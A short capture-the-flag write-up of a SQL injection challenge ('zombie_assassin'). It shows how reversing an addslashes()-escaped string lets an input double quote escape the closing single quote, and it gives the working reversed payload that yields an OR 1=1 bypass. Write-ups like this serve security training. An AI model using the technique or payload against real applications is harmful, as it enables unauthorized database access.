---
custom_edit_url: null
sidebar_position: 17
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/283aa376-d15c-49ea-92d5-30ce164ce2d7)

We are provided with the SQL query:

```sql
SELECT id FROM prob_zombie_assassin WHERE id='{$_GET[id]}' AND pw='{$_GET[pw]}'
```

This challenge use the `addslashes()` function to add a (`\`) before every input quote. It then reverses the string using the `strrev()`s function.

If we provide the following URI parameter:

```
?id="
```

The resultant query becomes:

```sql
SELECT id FROM prob_zombie_assassin WHERE id='"\' AND pw=''
```

Our input double-quote (`"`) is escaped (`\"`) and then the entire character sequence is reversed (`"\`).
This causes the original closing single-quote to be escaped (`"\'`) and the `"\' AND pw=` part is treated as a string.

We can now provide the following URI parameter:

```
?id="&pw=- -- 1=1 RO 
```

The resultant query becomes:

```sql
SELECT id FROM prob_zombie_assassin WHERE id='"\' AND pw=' OR 1=1 -- -'
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/6216a823-f0ba-4fd3-90ed-88b30bd5e938)
